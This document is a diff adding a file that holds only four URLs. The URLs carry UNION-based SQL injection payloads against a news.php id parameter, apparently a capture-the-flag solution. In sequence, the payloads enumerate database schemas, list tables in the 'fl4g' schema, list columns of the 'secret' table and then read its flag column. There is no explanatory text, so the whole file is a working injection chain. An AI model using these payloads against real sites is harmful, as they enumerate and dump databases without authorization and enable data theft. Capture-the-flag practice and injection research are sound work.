@@ -1,0 +1,7 @@
+http://kaibro.tw:9527/news.php?id=-1%20UNION%20SELECT%201,schema_name,3%20FROM%20information_schema.schemata%20LIMIT%201,1
+
+http://kaibro.tw:9527/news.php?id=-1%20UNION%20SELECT%201,table_name,3%20FROM%20information_schema.tables%20WHERE%20table_schema='fl4g'
+
+http://kaibro.tw:9527/news.php?id=-1%20UNION%20SELECT%201,column_name,3%20FROM%20information_schema.columns%20WHERE%20table_name='secret'%20LIMIT%201,1
+
+http://kaibro.tw:9527/news.php?id=-1%20UNION%20SELECT%201,THIS_IS_FLAG_YO,3%20FROM%20fl4g.secret
